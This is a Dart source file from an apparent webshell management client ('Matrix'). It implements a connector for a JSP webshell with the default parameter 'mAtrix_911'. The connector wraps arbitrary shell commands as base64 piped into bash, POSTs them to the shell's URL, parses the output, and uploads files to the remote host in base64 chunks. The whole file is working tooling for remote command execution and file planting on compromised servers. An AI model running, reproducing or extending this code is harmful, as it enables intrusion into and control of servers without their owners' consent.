import 'dart:async';
import 'dart:convert';

import 'package:flutter/foundation.dart';
import 'package:http/http.dart' as http;

import 'shell_connector.dart';
import 'shell_exec_connector.dart';
import '../utils/encoding_utils.dart';

/// `jsp_runtime_get.jsp` **不改**：`mAtrix_911` 仍为明文传给 `bash -c`。
/// Matrix 将真实脚本 UTF-8→Base64 后包成 `echo '…' | base64 -d | bash` 再作为参数值 POST（仅 ASCII）。
///
/// 一律 **POST**。内层脚本带 UTF-8 locale 前缀；[decodeWithFallback] 解析 `<pre>`。
class JspRuntimeConnector extends ShellExecConnector {
  JspRuntimeConnector(super.webshell);

  @override
  Set<ConnectorCapability> get capabilities => const {
        ConnectorCapability.shellExec,
        ConnectorCapability.fileRead,
        ConnectorCapability.fileWrite,
      };

  String get _param =>
      webshell.password?.isNotEmpty == true ? webshell.password! : 'mAtrix_911';

  static const String _kLocalePrelude =
      'export LANG=C.UTF-8 LC_ALL=C.UTF-8 LC_CTYPE=C.UTF-8; ';

  String _cmdForJsp(String cmd) => '$_kLocalePrelude$cmd';

  /// JSP 仍收「一条 shell 命令」；用管道 `base64 -d` 还原 UTF-8 脚本，无需改 JSP。
  String _transportWrappedScript(String innerBashScript) {
    final b64 = base64
        .encode(utf8.encode(innerBashScript))
        .replaceAll('\n', '')
        .replaceAll('\r', '');
    return 'echo ${_sq(b64)} | base64 -d | bash';
  }

  Future<String> _requestRuntime(String cmd, {Duration? timeout}) async {
    final t = timeout ?? const Duration(seconds: 30);
    try {
      final uri = Uri.parse(webshell.url);
      final payload = _transportWrappedScript(_cmdForJsp(cmd));

      final response = await http
          .post(
            uri,
            headers: {
              'Content-Type':
                  'application/x-www-form-urlencoded; charset=UTF-8',
              'Accept': 'text/html; charset=UTF-8',
              'Accept-Charset': 'utf-8',
            },
            body: {_param: payload},
            encoding: utf8,
          )
          .timeout(t);

      if (response.statusCode != 200) {
        return '[HTTP ${response.statusCode}]';
      }
      return _stripPre(decodeWithFallback(response.bodyBytes));
    } on TimeoutException {
      return '[Timeout]';
    } on http.ClientException catch (e) {
      return '[Connection Error] ${e.message}';
    } catch (e) {
      return '[Error] $e';
    }
  }

  static String _stripPre(String raw) {
    var s = raw.trim();
    if (s.startsWith('<pre>')) s = s.substring(5);
    if (s.endsWith('</pre>')) s = s.substring(0, s.length - 6);
    return s.trim();
  }

  @override
  Future<String> sendRawCommand(String cmd) => _requestRuntime(cmd);

  static const int _kUploadChunkBytes = 56 * 1024;

  static String _sq(String s) => ShellExecConnector.sq(s);

  @override
  Future<bool> writeFileBinaryWithProgress(
    String path,
    Uint8List bytes,
    void Function(int sent, int total) onProgress,
  ) async {
    final total = bytes.length;
    onProgress(0, total);
    final b64Path = base64.encode(utf8.encode(path));
    var offset = 0;
    var first = true;
    const uploadTimeout = Duration(seconds: 120);
    while (offset < total) {
      final end = (offset + _kUploadChunkBytes).clamp(0, total);
      final chunk = bytes.sublist(offset, end);
      final b64 = base64.encode(chunk);
      final redirect = first ? '>' : '>>';
      final cmd =
          '_p=\$(echo ${_sq(b64Path)}|base64 -d) && echo ${_sq(b64)} | base64 -d $redirect "\$_p" && echo 1 || echo 0';
      final r = await _requestRuntime(cmd, timeout: uploadTimeout);
      if (r.trim() != '1') {
        debugPrint(
          '[Matrix][jsp_runtime] 上传分块失败 path=$path offset=$offset total=$total '
          'response=${r.length > 400 ? '${r.substring(0, 400)}...' : r}',
        );
        return false;
      }
      offset = end;
      first = false;
      onProgress(offset, total);
    }
    return true;
  }

  @override
  Future<bool> writeFileBinary(String path, Uint8List bytes) async {
    return writeFileBinaryWithProgress(path, bytes, (_, _) {});
  }

  @override
  Future<bool> writeFile(String path, String content) async {
    return writeFileBinaryWithProgress(
      path,
      Uint8List.fromList(utf8.encode(content)),
      (_, _) {},
    );
  }
}
